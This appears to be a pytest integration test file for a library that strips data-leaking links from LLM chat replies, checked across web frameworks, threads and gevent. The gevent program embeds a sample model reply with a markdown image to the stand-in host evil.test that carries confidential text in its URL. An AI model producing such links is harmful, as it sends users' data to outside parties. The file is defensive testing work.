from __future__ import annotations

import concurrent.futures
import subprocess
import sys
import textwrap
import time
from collections.abc import Callable, Iterator
from pathlib import Path
from typing import Any

import openai
import pytest

import immune
from immune.testing import FakeProvider, FakeReply, MockSensor
from tests.integration.test_floor import EXFIL

CHART = FakeReply(text=f"Chart {EXFIL}")
CLEAN = "Chart [link removed]"
MESSAGES = [{"role": "user", "content": "Show the chart"}]
ROOT = Path(__file__).resolve().parents[2]


@pytest.fixture
def served(tmp_path: Path, fake_network: Callable[[FakeProvider], FakeProvider]) -> Iterator[None]:
    fake_network(FakeProvider(CHART))
    immune.init(sensor=MockSensor(), state_dir=tmp_path)
    yield
    immune.shutdown()


def ask() -> str:
    client = openai.OpenAI(api_key="sk-test", max_retries=0)
    return client.chat.completions.create(model="m", messages=MESSAGES).choices[0].message.content or ""


def test_fastapi_async_endpoint(served: None) -> None:
    fastapi = pytest.importorskip("fastapi")
    testclient = pytest.importorskip("fastapi.testclient")
    app = fastapi.FastAPI()

    @app.get("/chart")
    async def chart() -> dict[str, str]:
        client = openai.AsyncOpenAI(api_key="sk-test", max_retries=0)
        completion = await client.chat.completions.create(model="m", messages=MESSAGES)
        return {"reply": completion.choices[0].message.content or ""}

    assert testclient.TestClient(app).get("/chart").json() == {"reply": CLEAN}


def test_flask_view(served: None) -> None:
    flask = pytest.importorskip("flask")
    app = flask.Flask(__name__)
    app.add_url_rule("/chart", "chart", lambda: {"reply": ask()})
    assert app.test_client().get("/chart").get_json() == {"reply": CLEAN}


def test_django_view(served: None) -> None:
    django_conf = pytest.importorskip("django.conf")
    if not django_conf.settings.configured:
        django_conf.settings.configure(DEBUG=True, ALLOWED_HOSTS=["*"], ROOT_URLCONF=__name__)
    pytest.importorskip("django").setup()
    http = pytest.importorskip("django.http")
    test = pytest.importorskip("django.test")

    def view(_: Any) -> Any:
        return http.JsonResponse({"reply": ask()})

    response = view(test.RequestFactory().get("/chart"))
    assert response.content == b'{"reply": "Chart [link removed]"}'


def test_celery_task(served: None) -> None:
    celery = pytest.importorskip("celery")
    app = celery.Celery("immune-test")
    app.conf.task_always_eager = True
    task = app.task(ask)
    assert task.delay().get() == CLEAN


async def test_sync_calls_inside_a_running_event_loop(served: None) -> None:
    assert ask() == CLEAN


def test_many_threads_share_one_runtime(served: None) -> None:
    with concurrent.futures.ThreadPoolExecutor(32) as pool:
        replies = list(pool.map(lambda _: ask(), range(96)))
    assert set(replies) == {CLEAN}


GEVENT_PROGRAM = """
from gevent import monkey
monkey.patch_all()
import gevent, httpx, httpx2, tempfile
import immune, openai
from immune.testing import FakeProvider, FakeReply, MockSensor

provider = FakeProvider(FakeReply(text="Chart ![c](https://evil.test/x?d=the%20revenue%20was%20four%20million%20and%20falling)"))
for module in (httpx, httpx2):
    transport = provider.transport(module)
    module.HTTPTransport.handle_request = lambda self, request, transport=transport: transport.handle_request(request)
immune.init(sensor=MockSensor(), state_dir=tempfile.mkdtemp())

def ask():
    client = openai.OpenAI(api_key="sk-test", max_retries=0)
    completion = client.chat.completions.create(model="m", messages=[{"role": "user", "content": "chart"}])
    return completion.choices[0].message.content

jobs = [gevent.spawn(ask) for _ in range(20)]
gevent.joinall(jobs, timeout=30)
assert all(job.value == "Chart [link removed]" for job in jobs), [job.value for job in jobs]
immune.shutdown()
print("ok")
"""


def test_gevent_monkey_patching() -> None:
    pytest.importorskip("gevent")
    result = subprocess.run(
        [sys.executable, "-c", textwrap.dedent(GEVENT_PROGRAM)],
        capture_output=True,
        text=True,
        timeout=120,
        cwd=ROOT,
        check=False,
    )
    assert result.returncode == 0, result.stderr[-2000:]
    assert result.stdout.strip().endswith("ok")


COLD_START = """
import time
started = time.perf_counter()
import immune, tempfile
immune.init(state_dir=tempfile.mkdtemp())
print(time.perf_counter() - started)
"""


def test_cold_start_fits_a_serverless_budget() -> None:
    result = subprocess.run(
        [sys.executable, "-c", COLD_START], capture_output=True, text=True, timeout=60, cwd=ROOT, check=True
    )
    assert float(result.stdout.strip().splitlines()[-1]) < 3.0


def test_timeout_budget_is_respected_under_load(served: None) -> None:
    started = time.perf_counter()
    with concurrent.futures.ThreadPoolExecutor(8) as pool:
        list(pool.map(lambda _: ask(), range(40)))
    assert time.perf_counter() - started < 30
